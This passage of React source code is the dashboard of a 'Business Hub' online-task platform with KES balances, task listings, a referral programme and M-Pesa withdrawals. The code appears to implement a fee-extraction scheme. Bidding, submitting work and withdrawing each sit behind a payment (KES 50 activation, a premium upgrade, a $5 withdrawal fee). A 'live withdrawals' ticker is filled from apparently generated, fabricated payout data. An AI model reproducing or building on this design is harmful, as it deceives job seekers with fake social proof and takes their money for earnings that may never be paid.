    { icon: '✅', label: 'Awarded Tasks',         action: () => { onClose(); document.getElementById('tasks-section')?.scrollIntoView({ behavior: 'smooth' }); } },
    { icon: '📲', label: 'Withdraw with M-Pesa', action: () => { onClose(); onMpesaWithdraw(); } },
    { icon: '🎓', label: 'Apply for Training',    action: () => { onClose(); onTraining(); } },
    { icon: '🔗', label: 'My Referral Link',      action: () => { onClose(); onReferral(); } },
  ];

  return (
    <>
      <div className="hamburger-overlay" onClick={onClose} />
      <div className="hamburger-menu">
        <div className="hamburger-header">
          <div className="hamburger-user">
            <div className="dash-avatar" style={{ width: 48, height: 48, fontSize: 20 }}>
              {user?.fullName?.split(' ').map(n => n[0]).join('').slice(0, 2).toUpperCase() || 'U'}
            </div>
            <div>
              <div style={{ fontWeight: 700, fontSize: 15, color: 'var(--white)' }}>{user?.fullName}</div>
              <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)' }}>{user?.email}</div>
              <span className={`status-badge ${user?.activated ? 'status-active' : 'status-inactive'}`} style={{ marginTop: 4, display: 'inline-flex' }}>
                {user?.activated ? '✅ Active' : '⚠️ Inactive'}
              </span>
            </div>
          </div>
          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.2)', color: 'var(--white)', flexShrink: 0 }}>×</button>
        </div>
        <nav className="hamburger-nav">
          {items.map(item => (
            <button key={item.label} className="hamburger-item" onClick={item.action}>
              <span className="hamburger-item-icon">{item.icon}</span>
              <span>{item.label}</span>
              <span style={{ marginLeft: 'auto', color: 'var(--gray-light)', fontSize: 18 }}>›</span>
            </button>
          ))}
        </nav>
        <div className="hamburger-footer">
          <div style={{ fontSize: 11, color: 'var(--gray)', marginBottom: 8 }}>Account Balance</div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 28, color: 'var(--green)', marginBottom: 16 }}>
            KES {(user?.balance || 0).toLocaleString()}
          </div>
          <button className="logout-btn" style={{ width: '100%', justifyContent: 'center' }} onClick={onLogout}>
            ⏏ Sign Out
          </button>
        </div>
      </div>
    </>
  );
}

// ─── Main Dashboard ───────────────────────────────────────────────────────────
export default function Dashboard() {
  const router = useRouter();
  const [user,    setUser]    = useState(null);
  const [mounted, setMounted] = useState(false);

  const [selectedTask,        setSelectedTask]        = useState(null);
  const [payTask,             setPayTask]             = useState(null);
  const [showUpgrade,         setShowUpgrade]         = useState(false);
  const [showMpesaWithdraw,   setShowMpesaWithdraw]   = useState(false);
  const [mpesaInitialStep,    setMpesaInitialStep]    = useState('fee');
  const [showReferral,        setShowReferral]        = useState(false);
  const [showMenu,            setShowMenu]            = useState(false);
  const [showTraining,        setShowTraining]        = useState(false);

  const [liveWithdrawals, setLiveWithdrawals] = useState([]);
  const [filter, setFilter] = useState('All');
  const [search, setSearch] = useState('');

  const categories = [
    'All','Writing','Research','Data Entry','Design','Marketing',
    'Transcription','Translation','Survey','Testing','Audio','Education','Admin',
  ];

  useEffect(() => {
    async function init() {
      setMounted(true);
      const u = await getCurrentUser();
      if (!u) { router.replace('/login'); return; }
      setUser(u);
      setLiveWithdrawals(getOrGenerateWithdrawals());
    }
    init();
  }, [router]);

  // Detect return from Paystack after paying the $5 USD M-Pesa fee
  useEffect(() => {
    if (!user) return;
    const params    = new URLSearchParams(window.location.search);
    const plan      = params.get('plan');
    const trxref    = params.get('trxref');
    const reference = params.get('reference');
    if (plan === 'mpesa_withdrawal_fee' && (trxref || reference)) {
      router.replace('/dashboard', undefined, { shallow: true });
      setMpesaInitialStep('form');
      setShowMpesaWithdraw(true);
    }
  }, [user, router]);

  // Re-fetch user whenever the tab becomes visible (picks up Supabase admin edits)
  useEffect(() => {
    if (!user) return;
    const refresh = async () => {
      if (document.visibilityState === 'visible') {
        const u = await getCurrentUser().catch(() => null);
        if (u) setUser(u);
      }
    };
    document.addEventListener('visibilitychange', refresh);
    return () => document.removeEventListener('visibilitychange', refresh);
  }, [user]);

  const handleLogout       = useCallback(() => { logout(); router.push('/'); }, [router]);
  const handleViewTask     = useCallback(task => {
    if (!user?.activated) { setPayTask(task); } else { setSelectedTask(task); }
  }, [user]);
  const handleBidClick     = useCallback(task => { setSelectedTask(null); setPayTask(task); }, []);
  const handlePaySuccess   = useCallback(async () => {
    const updated = await activateUser(user.id);
    if (updated) setUser(updated);
  }, [user]);

  function handleSubmitTask(task) {
    if (!user.premium) {
      setShowUpgrade(true);
      return;
    }
    const subject = encodeURIComponent('Task Submission: ' + task.title);
    const body    = encodeURIComponent(
      `Hello Business Hub,\n\nPlease submit your tasks on email for review.\n\nTask: ${task.title}\nCategory: ${task.category}\nPayment: KES ${task.payment.toLocaleString()}\n\nYour submission:\n\n[Add your work here]\n\nSubmitted by: ${user?.fullName || ''}\nEmail: ${user?.email || ''}`
    );
    window.location.href = `mailto:businesshub.comke@gmail.com?subject=${subject}&body=${body}`;
  }

  const filteredTasks = (TASKS || []).filter(t => {
    const matchCat    = filter === 'All' || t.category === filter;
    const matchSearch = !search
      || t.title.toLowerCase().includes(search.toLowerCase())
      || t.description.toLowerCase().includes(search.toLowerCase());
    return matchCat && matchSearch;
  });

  if (!mounted || !user) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--white-off)' }}>
        <div className="spinner" style={{ width: 40, height: 40, borderTopColor: 'var(--green)', borderColor: 'var(--gray-light)', borderWidth: 3 }} />
      </div>
    );
  }

  const initials     = user.fullName?.split(' ').map(n => n[0]).join('').slice(0, 2).toUpperCase() || 'U';
  const referralLink = `https://onlinejob-pi.vercel.app/join?ref=${user.id || 'USER123'}`;

  return (
    <div className="dashboard">
      {/* Navbar */}
      <nav className="dash-navbar">
        <div className="dash-navbar-inner">
          <Link href="/" className="dash-logo">BUSINESS HUB</Link>
          <div className="dash-user">
            <div className="dash-user-info">
              <div className="dash-user-name">{user.fullName}</div>
              <div className="dash-user-email">{user.email}</div>
            </div>
            <div className="dash-avatar">{initials}</div>
            <button className="hamburger-btn" onClick={() => setShowMenu(true)} aria-label="Open menu">
              <span /><span /><span />
            </button>
          </div>
        </div>
      </nav>

      <main className="dash-main">
        {/* Welcome Banner */}
        <div className="dash-welcome">
          <div className="dash-welcome-text">
            <h2>Welcome back, {user.fullName.split(' ')[0]}! 👋</h2>
            <p>{user.email} • {user.country}</p>
            <div style={{ marginTop: 12 }}>
              <span className={`status-badge ${user.activated ? 'status-active' : 'status-inactive'}`}>
                {user.activated ? '✅ Active — Access valid 3 days' : '⚠️ Inactive — Pay KES 50 to Bid'}
              </span>
            </div>
          </div>
          <div className="dash-balance-box">
            <div className="dash-balance-label">Account Balance</div>
            <div className="dash-balance-amount">KES {(user.balance || 0).toLocaleString()}</div>
            <div className="dash-balance-sub">Available for withdrawal</div>
          </div>
        </div>

        {/* Referral Banner */}
        <div className="referral-banner" onClick={() => setShowReferral(true)}>
          <div className="referral-banner-left">
            <span className="referral-banner-icon">🔗</span>
            <div>
              <div className="referral-banner-title">Refer Friends &amp; Earn KES 70 Each</div>
              <div className="referral-banner-sub">Share your link • Track referrals • Get paid instantly</div>
            </div>
          </div>
          <div className="referral-banner-link">
            <span className="referral-link-preview">{referralLink.replace('https://', '')}</span>
            <button
              className="referral-copy-btn"
              onClick={e => {
                e.stopPropagation();
                navigator.clipboard.writeText(referralLink);
                alert('Referral link copied!');
              }}
            >
              Copy Link →
            </button>
          </div>
        </div>

        {/* Quick Action Tiles */}
        <div className="quick-actions">
          <button className="quick-action-card" onClick={() => setShowUpgrade(true)}>
            <span className="quick-action-icon">⭐</span>
            <span className="quick-action-label">{user?.premium ? 'Renew Premium' : 'Upgrade Premium'}</span>
          </button>
          <button className="quick-action-card" onClick={() => document.getElementById('tasks-section')?.scrollIntoView({ behavior: 'smooth' })}>
            <span className="quick-action-icon">✅</span>
            <span className="quick-action-label">Awarded Tasks</span>
          </button>
          <button className="quick-action-card quick-action-mpesa" onClick={() => setShowMpesaWithdraw(true)}>
            <span className="quick-action-icon">📲</span>
            <span className="quick-action-label">Withdraw with M-Pesa</span>
          </button>
          <button className="quick-action-card" onClick={() => setShowTraining(true)}>
            <span className="quick-action-icon">🎓</span>
            <span className="quick-action-label">Apply for Training</span>
          </button>
        </div>

        {/* Stats */}
        <div className="dash-stats">
          {[
            { icon: '📋', num: (TASKS || []).length,                    label: 'Available Tasks' },
            { icon: '💼', num: user.activeBids || 0,                     label: 'Active Bids' },
            { icon: '✅', num: user.completedTasks || 0,                 label: 'Completed Tasks' },
            { icon: '💰', num: `KES ${(user.balance || 0).toLocaleString()}`, label: 'Total Earned' },
          ].map(({ icon, num, label }) => (
            <div key={label} className="dash-stat-card">
              <div className="dash-stat-icon">{icon}</div>
              <div>
                <div className="dash-stat-num">{num}</div>
                <div className="dash-stat-label">{label}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Live Withdrawals Ticker */}
        <LiveWithdrawalsTicker withdrawals={liveWithdrawals} />

        {/* Tasks Section */}
        <div id="tasks-section">
          <div className="dash-section-title">Available Tasks</div>
          <div className="dash-section-sub">Browse and bid on tasks that match your skills</div>

          <div style={{ display: 'flex', gap: 12, marginBottom: 20, flexWrap: 'wrap' }}>
            <input
              type="text"
              placeholder="🔍 Search tasks..."
              value={search}
              onChange={e => setSearch(e.target.value)}
              style={{ flex: 1, minWidth: 200, padding: '10px 16px', border: '1.5px solid var(--gray-light)', borderRadius: 8, fontSize: 14, fontFamily: 'var(--font-body)', color: 'var(--black)', background: 'var(--white)' }}
            />
          </div>

          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 24 }}>
            {categories.map(cat => (
              <button
                key={cat}
                onClick={() => setFilter(cat)}
                style={{ padding: '6px 16px', borderRadius: 100, border: '1.5px solid', borderColor: filter === cat ? 'var(--green)' : 'var(--gray-light)', background: filter === cat ? 'var(--green)' : 'var(--white)', color: filter === cat ? 'var(--white)' : 'var(--gray)', fontSize: 13, fontWeight: 600, cursor: 'pointer', transition: 'all 0.2s', fontFamily: 'var(--font-body)' }}
              >
                {cat}
              </button>
            ))}
          </div>

          <div style={{ marginBottom: 16, fontSize: 14, color: 'var(--gray)' }}>
            Showing <strong>{filteredTasks.length}</strong> tasks
            {user.activated && (
              <span style={{ marginLeft: 10, color: '#059669', fontWeight: 600 }}>✅ All tasks unlocked</span>
            )}
          </div>

          <div className="tasks-grid">
            {filteredTasks.map(task => (
              <div key={task.id} className="task-card">
                <div className="task-card-header">
                  <div className="task-poster">
                    <div className="task-poster-avatar">{task.poster.charAt(0).toUpperCase()}</div>
                    <div>
                      <div className="task-poster-name">{task.poster}</div>
                      <div className="task-poster-date">{task.datePosted}</div>
                    </div>
                  </div>
                  <div className="task-payment">KES {task.payment.toLocaleString()}</div>
                </div>
                <div className="task-category">{task.category}</div>
                <div className="task-title">{task.title}</div>
                <div className="task-desc">{task.description}</div>
                <div className="task-actions">
                  <button className="task-view-btn" onClick={() => handleViewTask(task)}>👁️ View / Bid</button>
                  <button className="task-submit-btn" onClick={() => handleSubmitTask(task)} title="Submit this task via email">📤 Submit</button>
                </div>
              </div>
            ))}
          </div>
        </div>
      </main>

      {/* ── Modals ── */}
      {selectedTask && (
        <TaskModal task={selectedTask} user={user} onClose={() => setSelectedTask(null)} onBidClick={handleBidClick} onUpgradeClick={() => setShowUpgrade(true)} />
      )}
      {payTask && (
        <PaymentModal task={payTask} user={user} onClose={() => setPayTask(null)} onSuccess={handlePaySuccess} />
      )}
      {showUpgrade  && <UpgradeModal  user={user} onClose={() => setShowUpgrade(false)} />}
      {showReferral && <ReferralModal user={user} onClose={() => setShowReferral(false)} />}
      {showTraining && <TrainingModal user={user} onClose={() => setShowTraining(false)} />}

      {showMpesaWithdraw && (
        <MpesaWithdrawModal
          user={user}
          initialStep={mpesaInitialStep}
          onClose={() => { setShowMpesaWithdraw(false); setMpesaInitialStep('fee'); }}
        />
      )}

      {showMenu && (
        <HamburgerMenu
          user={user}
          onClose={() => setShowMenu(false)}
          onUpgrade={() => setShowUpgrade(true)}
          onMpesaWithdraw={() => setShowMpesaWithdraw(true)}
          onReferral={() => setShowReferral(true)}
          onTraining={() => setShowTraining(true)}
          onLogout={handleLogout}
        />
      )}
    </div>
  );
}
